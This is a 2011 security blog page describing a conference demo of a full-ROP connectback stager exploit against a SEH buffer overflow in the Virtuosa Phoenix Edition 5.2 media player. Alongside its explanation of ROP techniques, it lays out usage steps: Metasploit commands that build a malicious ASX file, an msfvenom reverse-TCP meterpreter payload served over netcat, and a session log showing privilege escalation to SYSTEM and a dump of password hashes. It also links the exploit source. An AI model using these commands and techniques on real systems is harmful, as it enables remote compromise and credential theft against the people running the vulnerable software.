<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[NDH2011] Demo: Virtuosa full ROP connectback stager</title>
  <meta name="description" content="Hello everyone!">

  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="canonical" href="/binholic/2011/06/23/ndh2011-demo-virtuosa-full-rop.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[NDH2011] Demo: Virtuosa full ROP connectback stager</h1>
    <p class="post-meta"><time datetime="2011-06-23T21:24:00+02:00" itemprop="datePublished">Jun 23, 2011</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Hello everyone!</p>

<p>This post will be about my demo I prepared for my talk at the NDH2011. As you know, it failed! It was due to some metasploit depency problem (I checked and netcat receive the connection from the VM).</p>

<h1 id="introduction">Introduction</h1>

<p>The following ROP sploit was based on the following exploit: <a href="http://www.exploit-db.com/exploits/16070/">Virtuosa Phoenix Edition 5.2 ASX SEH BOF</a>.</p>

<p>Basically, if we have a href which is too long, we trigger a SEH BOF.</p>

<p>The problem is that it has a character filter, all UPPER are converted to LOWER and all LOWER near a special character such as “ -;,\/” (without the quotes) will get converted to an UPPER character.</p>

<p>Basically, it forbids all existing encoders, even alpha 2!</p>

<p>There are 2 solutions to bypass this restrictive filter: either code an lower encoder or use a ROP payload. I chose the second solution as I haven’t seen any public exploit using a full ROP payload.</p>

<p>I won’t explain how to exploit a SEH BOF since it has been explained many times, the interesting part here will be about the ROP techniques used. I will explain techniques but I won’t go through the code as it is already heavily commented (if you still don’t understand it, don’t hesitate to ask).</p>

<p>Just so you know, it is not for the faint of heart, it really is not an easy task, it mostly takes a LOT of time.</p>

<h1 id="the-filter">The filter</h1>

<p>The character filter looked a lot like the following C code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="code"><pre><span class="kt">char</span><span class="o">*</span> <span class="nf">filter_badchar</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">sz</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">sz</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">sz</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">sz</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">';'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'\\'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'/'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="sc">'z'</span><span class="p">)</span>
                <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="sc">'A'</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">)</span>
            <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">sz</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>You either bypass it using an encoder or a ROP payload.</p>

<h1 id="the-payload">The payload</h1>

<p>I had multiple prerequisites for my payload to satisfy me:</p>

<ul>
  <li>bypass firewalls</li>
  <li>bypass NAT</li>
  <li>be flexible as to the stuffs I can do</li>
  <li>full ROP</li>
</ul>

<p>So basically, I was requesting for a connectback stager.</p>

<p>So my payload do the following:</p>

<ul>
  <li>copy ROP stack to a static zone (so it easier to fix arguments and such)</li>
  <li>allocate RWX memory: HeapCreate() + HeapAlloc()</li>
  <li>initialize socket</li>
  <li>connect back to host (attacker machine)</li>
  <li>receive payload in allocated memory</li>
  <li>execute payload</li>
</ul>

<p>If the connection fail in some ways, the exploit will fail, there is no backup or infinite loop for trying (even though it could be implemented using ROP tricks).  There are multiple problem to be solved before getting to our ROP payload: we need to construct it. Effectively, there is import resolution, string tables fixing, address fixing, arguments fixing. The goal is to get to avoid bad chars as well.</p>

<h1 id="the-rop-stack">The ROP Stack</h1>

<p>What is really important to understand while ropping is that we are constructing, patching/fixing/modifying stack elements in order to have a chain of functions calls using basic operation (that we call gadgets). We could also use it to construct a payload in a newly obtained WX memory or receive “traditionnal” payloads. ROP is thus mainly used as a “stager” in the sense that we first use it to get WX memory and then use a “normal” payload.  ROP is turing complete as it is possible to do anything we want with it. We can write, save in memory and we can also have conditions! I suggest you to read the paper on ROP stack generation which also speak about it (LAHF and PUSHF).</p>

<p>Ok now on with the show :).</p>

<p>Since we are triggering a SEH BOF, we will have a ROP stack splitted in 2 parts: before and after the overwritten SEH handler. It is about calculating offsets and bytes used, nothing too heavy in there. What I did is that I mainly constructed my ROP payload and then I splitted it.</p>

<p>In the ROP stack I basically do the following:</p>
<ul>
  <li>get ESP - set up arguments of LoadLibrary()</li>
  <li>resolve LoadLibrary()</li>
  <li>LoadLibrary(“ws2_32.dll”);</li>
  <li>resolve GetProcAddress()</li>
  <li>Set all GetProcAddress() function name argument</li>
  <li>end strings correctly (with NULL)</li>
  <li>fix wsastartup to WSAStartup and fix wsacleanup to WSACleanup</li>
  <li>Set hLibModule argument in all corresponding GetProcAddress() to “LoadLibrary(“ws2_32.dll”)”</li>
  <li>resolve imports</li>
  <li>then we have the part were we set up all the arguments of the payload</li>
  <li>we “execute” the payload</li>
  <li>we get a stager sent by metasploit that will get a payload (such as a DLL injector or something like that) or a payload (launch calc! :))</li>
</ul>

<p>These things happen so fast that you should not forget to have listeners, handlers ready at the other end of the line … or Virtuosa will just gracefully crash with you not getting anything ;).</p>

<h1 id="how-do-you-construct-a-rop-payload-without-getting-lost">How do you construct a ROP payload without getting lost?</h1>

<p>Believe it or not, it’s really easy to get lost while developing a ROP payload.
Thing is: we often wants to generate values that have the same properties (=&gt; power of 2? divisible by x? etc). Or we want to be able to allocate multiple buffers?</p>

<p>The “secret ingredient” is the same as in programming: “divide to conquer”. Create functions that does a specific thing using gadgets. This way you can re-use it. The problem it poses is about optimisation, but you either get ultra optimised ROP stack or well organized one. Your choice ;). In the future, tools to optimise and maintain ROP sploits will be developed anyway (MONA is the beginning, thanks to c0relanc0d3r and others as well).</p>

<h1 id="how-to-avoid-badchars-in-a-rop-payload">How to avoid badchars in a ROP payload?</h1>

<p>As you will see in the code, I created multiple function to check that I have addresses with good characters only. I used the principle of pointer encoding, in this case additive encoding (subtractive decoding) was used.</p>

<p>For NULLs, we can use these kind of instructions:</p>

<ul>
  <li>XOR REG32, REG32</li>
  <li>MOV [REGa32], REGb32</li>
  <li>etc</li>
</ul>

<p>For other values, you have to generate them. What is good to know is that most of the “flags” values used in function calls are power of 2, it is simply because it is easy to use multiple flags at the same time and extract them with logical/arithmetical operations: AND, XOR, ADD, SUB, etc.</p>

<p>Most of the time, these kind of instructions can be found:</p>

<ul>
  <li>XCHG EAX, ESI</li>
  <li>XCHG EAX, ECX</li>
  <li>ADD ESI, ESI</li>
  <li>INC EAX</li>
  <li>XOR EAX, EAX</li>
  <li>MOV [ECX], EAX</li>
</ul>

<p>With those instructions you can generate any values and patch the memory as you see fit.</p>

<p>There are other tricks to know too. You want to substract but you only have access to ADD? … Think about integer overflow. The goal is not really to substract but to correctly compute a certain value. In the end, ADD and SUB works mostly the same in digital logic.</p>

<p>Others techniques to avoid badchars, instead of constantly fixing all the addresses you have, which use quite a big amount of pointers, I decided to use a retslide to shift to the addresses of interest and thus avoid any bad addresses.</p>

<p>In short:</p>

<ul>
  <li>pointer encoding</li>
  <li>generating values</li>
  <li>integer overflows</li>
  <li>retslide</li>
</ul>

<h1 id="other-stuffs-to-know-about-ropping">Other stuffs to know about ROPping</h1>

<p>Most of the strings in Windows functions are NULL terminated (ASCII based) even though it supports UNICODE. You thus have to have correctly ended strings.
For that:</p>

<ul>
  <li>XOR EAX, EAX</li>
  <li>MOV [ECX], EAX</li>
</ul>

<p>These can be quite useful to fix the stack up.</p>

<p>While calling a function, the most common technique is to fix the stack up using patching instructions:</p>

<ul>
  <li>MOV [ECX], EAX</li>
</ul>

<p>You could also use PUSHAD which is kind of a ugly hack but it can be useful to know.</p>

<p>While calling a function, if it takes a string arguments, be sure that your string table is upper in memory (lower in the stack) as the function could end up crushing over your string table and make the call fail. It is often the case with Win32 API calls since it ends in the kernel and it ends up crushing a lot of stuff upper in the stack (lower in memory).</p>

<p>Moving around in our payload is mostly done with:</p>

<ul>
  <li>XCHG EAX, ESP</li>
</ul>

<p>It is quite an interesting instruction as using it cleverly, you could have infinite loops, branching, etc.</p>

<p>So before using that instruction, be sure to get ESP somewhere (using stuff like PUSHAD and POPS or PUSH ESP # POP REG32).</p>

<p>Ok you’re lacking registers? Use memory!</p>

<p>Most of the gadgets use EAX, ECX and ESI, if you’re stuck with registers, try using RW memory to save your value and recover it later.</p>

<h1 id="how-to-use-the-sploit">How to use the sploit?</h1>

<p>This sploit is sure not user friendly.
It is made for hacker alike anyway.
I could have done it without metasploit … but it has so many convenient payloads … why reinvent the wheel? ;)</p>

<p>Anyway here is the “manual”: - Depending on the type of payload you’re selecting (with or without network, without means it’s usually a standalone payload that doesn’t need a stager such as it is the case with calc) you’ll either need 2 or 3 terminals on the host machine.</p>

<ul>
  <li>First terminal: generating the file</li>
</ul>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td><td class="code"><pre><span class="nv">$ </span>./msfconsole 

<span class="c">#    # ###### #####   ##    ####  #####  #       ####  # #####</span>
<span class="c">##  ## #        #    #  #  #      #    # #      #    # #   #</span>
<span class="c"># ## # #####    #   #    #  ####  #    # #      #    # #   #</span>
<span class="c">#    # #        #   ######      # #####  #      #    # #   #</span>
<span class="c">#    # #        #   #    # #    # #      #      #    # #   #</span>
<span class="c">#    # ######   #   #    #  ####  #      ######  ####  #   #</span>


       <span class="o">=[</span> metasploit v3.7.2-release <span class="o">[</span>core:3.7 api:1.0]
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 705 exploits - 358 auxiliary - 56 post
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 224 payloads - 27 encoders - 8 nops
       <span class="o">=[</span> svn r13015 updated today <span class="o">(</span>2011.06.23<span class="o">)</span>

msf <span class="o">&gt;</span> use exploit/windows/fileformat/virtuosa 
msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> show options 

Module options <span class="o">(</span>exploit/windows/fileformat/virtuosa<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   FILENAME  msf.asx          <span class="nb">yes       </span>The file name
   LHOST                      <span class="nb">yes       </span>The listen address
   LPORT                      <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Windows XP SP3 English


msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.56.1
LHOST <span class="o">=&gt;</span> 192.168.56.1
msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 8080
LPORT <span class="o">=&gt;</span> 8080
msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> exploit 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Before SEH:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> String table size     : 100
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Pointers used         : 126 <span class="o">(</span>504 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Junk bytes used       : 288
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Padding size          : 96
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ROP stack size        : 1029
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bytes before SEH write: <span class="nt">-4</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Total:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Pointers used         : 486 <span class="o">(</span>1944 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Junk bytes used       : 416
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ROP stack size        : 2597
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating <span class="s1">'msf.asx'</span> file ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generated output file /home/kurapix/.msf3/data/exploits/msf.asx
msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> 
</pre></td></tr></tbody></table></code></pre></figure>

<p>Here the host and port will point at the machine with the listening netcat</p>

<ul>
  <li>Second terminal: netcat listener (send payload or stager)</li>
</ul>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="nv">$ </span>./msfvenom <span class="nt">--payload</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nt">--format</span> raw | nc <span class="nt">-v</span> <span class="nt">-l</span> 8080
</pre></td></tr></tbody></table></code></pre></figure>

<p>En fait je me suis rendu compte que c’est là où ma démo a merdé: j’avais oublié de spécifié le LHOST lors de mon talk.</p>

<p>Sous le coup du stress et de manque de temps, j’ai préféré passer à la suite du talk.
C’était la première fois que je faisais un talk devant autant de monde après tout.</p>

<ul>
  <li>Third terminal: sending the payload if stager needed</li>
</ul>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="code"><pre><span class="nv">$ </span>./msfconsole 

                <span class="c">##                          ###           ##    ##</span>
 <span class="c">##  ##  #### ###### ####  #####   #####    ##    ####        ######</span>
<span class="c">####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##</span>
<span class="c">####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##</span>
<span class="c">## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##</span>
<span class="c">##   ##  #### ###   #####   #####     ##   ####   ####   #### ###</span>
                                      <span class="c">##</span>


       <span class="o">=[</span> metasploit v3.7.2-release <span class="o">[</span>core:3.7 api:1.0]
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 705 exploits - 358 auxiliary - 56 post
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 224 payloads - 27 encoders - 8 nops
       <span class="o">=[</span> svn r13015 updated today <span class="o">(</span>2011.06.23<span class="o">)</span>

msf <span class="o">&gt;</span> use exploit/multi/handler 
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> show options 

Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:

   Name  Current Setting  Required  Description
   <span class="nt">----</span>  <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  process          <span class="nb">yes       </span>Exit technique: seh, thread, none, process
   LHOST                      <span class="nb">yes       </span>The listen address
   LPORT     4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Wildcard Target


msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.56.1
LHOST <span class="o">=&gt;</span> 192.168.56.1
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> exploit 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse handler on 0.0.0.0:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the payload handler...
</pre></td></tr></tbody></table></code></pre></figure>

<ul>
  <li>Then you can launch Virtuosa and import the ASX file (and pawn it).
You will then get the following in the second terminal (netcat listener):</li>
</ul>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted
</pre></td></tr></tbody></table></code></pre></figure>

<p>You will then get the following in the third terminal:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>749056 bytes<span class="o">)</span> to 192.168.56.101
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.56.1:4444 -&gt; 192.168.56.101:1091<span class="o">)</span> at Thu Jun 23 20:12:21 +0100 2011

meterpreter <span class="o">&gt;</span> getuid 
Server username: EXPERIEN-FB44F4<span class="se">\A</span>dministrator
meterpreter <span class="o">&gt;</span> getsystem 
...got system <span class="o">(</span>via technique 1<span class="o">)</span><span class="nb">.</span>
meterpreter <span class="o">&gt;</span> getuid 
Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
meterpreter <span class="o">&gt;</span> hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ASPNET:1003:c0a59a9e0736c578ddde1757bd48098f:0aff8f664031790f6cf554a30d834161:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:611c44014cc419901607081e8472f214:c9c888b7f1894ba4b72503ca73afc10d:::
SUPPORT_388945a0?  :1002:aad3b435b51404eeaad3b435b51404ee:c0c37c4d63b49404638bb9898744285c:::
meterpreter <span class="o">&gt;</span> ps

Process list
<span class="o">============</span>

 PID   Name              Arch  Session  User                           Path
 <span class="nt">---</span>   <span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>                           <span class="nt">----</span>
 0     <span class="o">[</span>System Process]                                                
 4     System            x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            
 532   smss.exe          x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            <span class="se">\S</span>ystemRoot<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
 596   csrss.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
 620   winlogon.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
 664   services.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>ervices.exe
 676   lsass.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>sass.exe
 836   VBoxService.exe   x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\V</span>BoxService.exe
 884   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 960   svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE   C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1052  svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\s</span>vchost.exe
 1108  svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE   C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1200  svchost.exe       x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE     C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1616  spoolsv.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>poolsv.exe
 1776  explorer.exe      x86   0        EXPERIEN-FB44F4<span class="se">\A</span>dministrator  C:<span class="se">\W</span>INDOWS<span class="se">\E</span>xplorer.EXE
 1884  VBoxTray.exe      x86   0        EXPERIEN-FB44F4<span class="se">\A</span>dministrator  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\V</span>BoxTray.exe
 1896  ctfmon.exe        x86   0        EXPERIEN-FB44F4<span class="se">\A</span>dministrator  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>tfmon.exe
 2008  svchost.exe       x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE     C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1316  alg.exe           x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE     C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\a</span>lg.exe
 828   wuauclt.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>uauclt.exe
 1104  Virtuosa.exe      x86   0        EXPERIEN-FB44F4<span class="se">\A</span>dministrator  C:<span class="se">\P</span>rogram Files<span class="se">\V</span>irtuosa<span class="se">\V</span>irtuosa.exe

meterpreter <span class="o">&gt;</span> 
</pre></td></tr></tbody></table></code></pre></figure>

<p>If you want to use those kind of payloads: shell_reverse_tcp, meterpreter, etc. metasploit first send a stager then the corresponding payload. The thing is … exploits/multi/handler only sends the payload and not the stager so you basically get a crash (ever tried to directly execute a DLL from its first byte? =&gt; crash, need a DLL injector or something like that). That is why we need the netcat listener which send the stager for those payloads.</p>

<p>For payloads such as calc, regedit, messagebox, etc, no stager needed, we directly get the payload from msfvenom.
For example for messagebox, you generate the file and then have that in the netcat listener terminal:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="nv">$ </span>./msfvenom <span class="nt">--payload</span> windows/messagebox <span class="nv">ICON</span><span class="o">=</span>WARNING <span class="nv">TEXT</span><span class="o">=</span><span class="s2">"Hacked by m_101 :)"</span> <span class="nt">--format</span> raw | nc <span class="nt">-v</span> <span class="nt">-l</span> 8080
Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted
</pre></td></tr></tbody></table></code></pre></figure>

<p>You basically end up having a nice messagebox like this:</p>

<p><img src="/assets/img/virtuosa_messagebox.png" alt="Virtuasa Pwned" /></p>

<h1 id="the-sploit">The sploit</h1>

<p>Just so you know, for struct sockaddr_in, I used ugly hacks (since I couldn’t find htons, ntohs, etc equivalent) so it should only work on x86 or x86_64 (due to endianness).</p>

<ul>
  <li><a href="/assets/others/virtuosa.rb">Virtuosa Phoenix Edition 5.2 Full ROP Connectback Stager</a>.</li>
</ul>

<h1 id="conclusion">Conclusion</h1>

<p>By now, you should be quite convinced that we really do not need any code in our crafted file in order to do things. The question is more about the space we have at disposal that the possibilities ;).</p>

<p>For a first talk in front of so many people it did not go that bad.
Ok the demo failed and I panicked a bit about it I must admit haha.
Next time I’ll prepare myself even more!
Video is the key ;).</p>

<p>We have seen many techniques concerning ROPping, hope it helps to get you along on this boat. It is not easy, it is not for everyone but it is without a doubt an essential technique to have in our arsenal of tools. I wonder what it is like to have ASLR+DEP bypass though and working only with offsets …. infoleaks? … well … not today.</p>

<p>Cheers,</p>

<p>m_101</p>

<h1 id="resources">Resources</h1>

<ul>
  <li><a href="/assets/others/exploits/virtuosa.rb">Virtuosa Phoenix Edition 5.2 Full ROP Connectback Stager</a></li>
</ul>


  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2011/06/20/en-ndh2011-bilan.html">Previous : [EN] NDH2011: Bilan</a>
    

    
    <a class="post-next" href="/binholic/2011/06/29/brainfuck-get-ready-to-get-your-brain-crushed.html">Next : Brainfuck: Get ready to get your brain crushed!</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/binholic/2011/06/23/ndh2011-demo-virtuosa-full-rop.html";
            this.page.identifier = "/binholic/2011/06/23/ndh2011-demo-virtuosa-full-rop";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

